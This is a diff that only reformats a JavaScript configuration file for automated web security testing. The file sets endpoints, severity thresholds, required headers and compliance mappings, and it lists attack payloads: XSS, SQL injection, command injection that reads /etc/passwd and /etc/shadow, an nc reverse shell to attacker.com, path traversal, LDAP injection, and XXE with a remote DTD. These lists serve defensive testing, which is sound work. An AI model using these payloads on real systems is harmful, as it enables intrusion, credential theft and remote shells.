@@ -17,10 +17,10 @@ module.exports = {
         { name: 'Products', url: '/products' },
         { name: 'Cart', url: '/cart' },
         { name: 'Checkout', url: '/checkout' },
-        { name: 'Profile', url: '/profile' }
-      ]
+        { name: 'Profile', url: '/profile' },
+      ],
     },
-    
+
     // API security testing
     api: {
       enabled: true,
@@ -34,11 +34,11 @@ module.exports = {
         { path: '/products/search', method: 'GET', protected: false },
         { path: '/cart', method: 'GET', protected: true },
         { path: '/orders', method: 'GET', protected: true },
-        { path: '/admin/users', method: 'GET', protected: true, admin: true }
-      ]
-    }
+        { path: '/admin/users', method: 'GET', protected: true, admin: true },
+      ],
+    },
   },
-  
+
   // Vulnerability testing payloads
   payloads: {
     // Cross-Site Scripting (XSS) payloads
@@ -57,9 +57,9 @@ module.exports = {
       '<textarea onfocus=alert("XSS") autofocus>',
       '<keygen onfocus=alert("XSS") autofocus>',
       '<video><source onerror="alert(\'XSS\')">',
-      '<audio src=x onerror=alert("XSS")>'
+      '<audio src=x onerror=alert("XSS")>',
     ],
-    
+
     // SQL Injection payloads
     sqlInjection: [
       "' OR '1'='1",
@@ -72,10 +72,10 @@ module.exports = {
       "') OR ('1'='1",
       "' OR 1=1#",
       "' UNION SELECT username, password FROM users--",
-      "1; SELECT * FROM users",
-      "'; EXEC xp_cmdshell('dir'); --"
+      '1; SELECT * FROM users',
+      "'; EXEC xp_cmdshell('dir'); --",
     ],
-    
+
     // Command Injection payloads
     commandInjection: [
       '; ls -la',
@@ -89,9 +89,9 @@ module.exports = {
       '; cat /etc/shadow',
       '`cat /etc/passwd`',
       '$(cat /etc/passwd)',
-      '; nc -e /bin/sh attacker.com 4444'
+      '; nc -e /bin/sh attacker.com 4444',
     ],
-    
+
     // Path Traversal payloads
     pathTraversal: [
       '../../../etc/passwd',
@@ -102,29 +102,29 @@ module.exports = {
       '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
       '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
       '..//..//..//etc//passwd',
-      '..\\\\..\\\\..\\\\etc\\\\passwd'
+      '..\\\\..\\\\..\\\\etc\\\\passwd',
     ],
-    
+
     // LDAP Injection payloads
     ldapInjection: [
       '*)(uid=*))(|(uid=*',
       '*)(|(password=*))',
       '*)(&(password=*))',
       '*))%00',
-      '*()|%26\'',
+      "*()|%26'",
       '*)((|(*',
-      '*)(objectClass=*'
+      '*)(objectClass=*',
     ],
-    
+
     // XML Injection payloads
     xmlInjection: [
       '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
       '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>',
       '<![CDATA[<script>alert("XSS")</script>]]>',
-      '&lt;script&gt;alert("XSS")&lt;/script&gt;'
-    ]
+      '&lt;script&gt;alert("XSS")&lt;/script&gt;',
+    ],
   },
-  
+
   // Security testing categories
   testCategories: {
     inputValidation: {
@@ -135,10 +135,10 @@ module.exports = {
         'command-injection-prevention',
         'path-traversal-prevention',
         'ldap-injection-prevention',
-        'xml-injection-prevention'
-      ]
+        'xml-injection-prevention',
+      ],
     },
-    
+
     authentication: {
       enabled: true,
       tests: [
@@ -146,71 +146,46 @@ module.exports = {
         'brute-force-protection',
         'session-management',
         'jwt-security',
-        'multi-factor-authentication'
-      ]
+        'multi-factor-authentication',
+      ],
     },
-    
+
     authorization: {
       enabled: true,
-      tests: [
-        'access-control',
-        'privilege-escalation',
-        'idor-prevention',
-        'role-based-access'
-      ]
+      tests: ['access-control', 'privilege-escalation', 'idor-prevention', 'role-based-access'],
     },
-    
+
     sessionManagement: {
       enabled: true,
-      tests: [
-        'session-fixation',
-        'session-hijacking',
-        'session-timeout',
-        'secure-cookies'
-      ]
+      tests: ['session-fixation', 'session-hijacking', 'session-timeout', 'secure-cookies'],
     },
-    
+
     dataProtection: {
       enabled: true,
-      tests: [
-        'sensitive-data-exposure',
-        'data-encryption',
-        'pii-protection',
-        'credit-card-data'
-      ]
+      tests: ['sensitive-data-exposure', 'data-encryption', 'pii-protection', 'credit-card-data'],
     },
-    
+
     communicationSecurity: {
       enabled: true,
-      tests: [
-        'https-enforcement',
-        'tls-configuration',
-        'certificate-validation',
-        'hsts-headers'
-      ]
+      tests: ['https-enforcement', 'tls-configuration', 'certificate-validation', 'hsts-headers'],
     },
-    
+
     errorHandling: {
       enabled: true,
       tests: [
         'information-disclosure',
         'error-message-security',
         'stack-trace-exposure',
-        'debug-information'
-      ]
+        'debug-information',
+      ],
     },
-    
+
     configuration: {
       enabled: true,
-      tests: [
-        'security-headers',
-        'cors-configuration',
-        'csp-implementation',
-        'file-permissions'
-      ]
-    }
+      tests: ['security-headers', 'cors-configuration', 'csp-implementation', 'file-permissions'],
+    },
   },
-  
+
   // Security thresholds and scoring
   thresholds: {
     // Vulnerability severity scoring
@@ -219,27 +194,27 @@ module.exports = {
       high: { score: 7, maxAllowed: 0 },
       medium: { score: 4, maxAllowed: 2 },
       low: { score: 1, maxAllowed: 5 },
-      info: { score: 0, maxAllowed: 10 }
+      info: { score: 0, maxAllowed: 10 },
     },
-    
+
     // Overall security score thresholds
     securityScore: {
       excellent: 95,
       good: 80,
       acceptable: 65,
       poor: 50,
-      critical: 30
+      critical: 30,
     },
-    
+
     // Performance thresholds for security tests
     performance: {
       maxTestDuration: 300000, // 5 minutes per test
       maxTotalDuration: 1800000, // 30 minutes total
       requestTimeout: 30000, // 30 seconds per request
-      retryAttempts: 3
-    }
+      retryAttempts: 3,
+    },
   },
-  
+
   // Security headers configuration
   securityHeaders: {
     required: [
@@ -247,109 +222,113 @@ module.exports = {
         name: 'Content-Security-Policy',
         description: 'Prevents XSS attacks',
         severity: 'high',
-        validValues: ['script-src', 'object-src', 'base-uri']
+        validValues: ['script-src', 'object-src', 'base-uri'],
       },
       {
         name: 'X-Frame-Options',
         description: 'Prevents clickjacking',
         severity: 'medium',
-        validValues: ['DENY', 'SAMEORIGIN']
+        validValues: ['DENY', 'SAMEORIGIN'],
       },
       {
         name: 'X-Content-Type-Options',
         description: 'Prevents MIME type sniffing',
         severity: 'medium',
-        validValues: ['nosniff']
+        validValues: ['nosniff'],
       },
       {
         name: 'X-XSS-Protection',
         description: 'Enables XSS filtering',
         severity: 'low',
-        validValues: ['1; mode=block']
+        validValues: ['1; mode=block'],
       },
       {
         name: 'Strict-Transport-Security',
         description: 'Enforces HTTPS',
         severity: 'high',
-        validValues: ['max-age=']
+        validValues: ['max-age='],
       },
       {
         name: 'Referrer-Policy',
         description: 'Controls referrer information',
         severity: 'low',
-        validValues: ['strict-origin-when-cross-origin', 'no-referrer']
-      }
+        validValues: ['strict-origin-when-cross-origin', 'no-referrer'],
+      },
     ],
-    
+
     // Headers that should not be present
     forbidden: [
       {
         name: 'Server',
         description: 'Reveals server information',
-        severity: 'low'
+        severity: 'low',
       },
       {
         name: 'X-Powered-By',
         description: 'Reveals technology stack',
-        severity: 'low'
+        severity: 'low',
       },
       {
         name: 'X-AspNet-Version',
         description: 'Reveals ASP.NET version',
-        severity: 'low'
-      }
-    ]
+        severity: 'low',
+      },
+    ],
   },
-  
+
   // Cookie security requirements
   cookieSecurity: {
     sessionCookies: {
       httpOnly: true,
       secure: true, // For HTTPS sites
       sameSite: ['Strict', 'Lax'],
-      minLength: 16
+      minLength: 16,
     },
-    
+
     // Cookie names that should be secure
-    secureCookieNames: [
-      'session',
-      'sessionid',
-      'auth',
-      'token',
-      'csrf',
-      'xsrf'
-    ]
+    secureCookieNames: ['session', 'sessionid', 'auth', 'token', 'csrf', 'xsrf'],
   },
-  
+
   // File upload security configuration
   fileUpload: {
     allowedExtensions: ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.doc', '.docx'],
-    blockedExtensions: ['.exe', '.bat', '.cmd', '.scr', '.pif', '.com', '.js', '.php', '.asp', '.jsp'],
+    blockedExtensions: [
+      '.exe',
+      '.bat',
+      '.cmd',
+      '.scr',
+      '.pif',
+      '.com',
+      '.js',
+      '.php',
+      '.asp',
+      '.jsp',
+    ],
     maxFileSize: 10485760, // 10MB
     scanForMalware: true,
-    quarantineUploads: true
+    quarantineUploads: true,
   },
-  
+
   // Rate limiting configuration
   rateLimiting: {
     login: {
       maxAttempts: 5,
       timeWindow: 900000, // 15 minutes
-      lockoutDuration: 1800000 // 30 minutes
+      lockoutDuration: 1800000, // 30 minutes
     },
-    
+
     api: {
       maxRequests: 100,
       timeWindow: 3600000, // 1 hour
-      burstLimit: 20
+      burstLimit: 20,
     },
-    
+
     registration: {
       maxAttempts: 3,
-      timeWindow: 3600000 // 1 hour
-    }
+      timeWindow: 3600000, // 1 hour
+    },
   },
-  
+
   // Reporting configuration
   reporting: {
     formats: ['html', 'json', 'pdf', 'junit'],
@@ -357,7 +336,7 @@ module.exports = {
     includeScreenshots: true,
     includeRequestResponse: true,
     generateExecutiveSummary: true,
-    
+
     // Report sections
     sections: {
       executiveSummary: true,
@@ -365,10 +344,10 @@ module.exports = {
       riskAssessment: true,
       remediationGuidance: true,
       complianceMapping: true,
-      trendAnalysis: true
-    }
+      trendAnalysis: true,
+    },
   },
-  
+
   // Integration settings
   integration: {
     // CI/CD integration
@@ -377,9 +356,9 @@ module.exports = {
       failOnHigh: true,
       failOnSecurityScore: 65,
       generateArtifacts: true,
-      notifyOnFailure: true
+      notifyOnFailure: true,
     },
-    
+
     // Issue tracking integration
     issueTracking: {
       enabled: false,
@@ -389,19 +368,19 @@ module.exports = {
         critical: 'P0',
         high: 'P1',
         medium: 'P2',
-        low: 'P3'
-      }
+        low: 'P3',
+      },
     },
-    
+
     // SIEM integration
     siem: {
       enabled: false,
       endpoint: process.env.SIEM_ENDPOINT,
       apiKey: process.env.SIEM_API_KEY,
-      logLevel: 'warning'
-    }
+      logLevel: 'warning',
+    },
   },
-  
+
   // Compliance frameworks
   compliance: {
     owasp: {
@@ -417,23 +396,20 @@ module.exports = {
         'A07:2021-Identification and Authentication Failures',
         'A08:2021-Software and Data Integrity Failures',
         'A09:2021-Security Logging and Monitoring Failures',
-        'A10:2021-Server-Side Request Forgery'
-      ]
+        'A10:2021-Server-Side Request Forgery',
+      ],
     },
-    
+
     pci: {
       enabled: false,
-      requirements: [
-        'PCI DSS 3.2.1',
-        'PCI DSS 4.0'
-      ]
+      requirements: ['PCI DSS 3.2.1', 'PCI DSS 4.0'],
     },
-    
+
     gdpr: {
       enabled: true,
       dataProtectionRequirements: true,
       consentManagement: true,
-      dataMinimization: true
-    }
-  }
+      dataMinimization: true,
+    },
+  },
 };
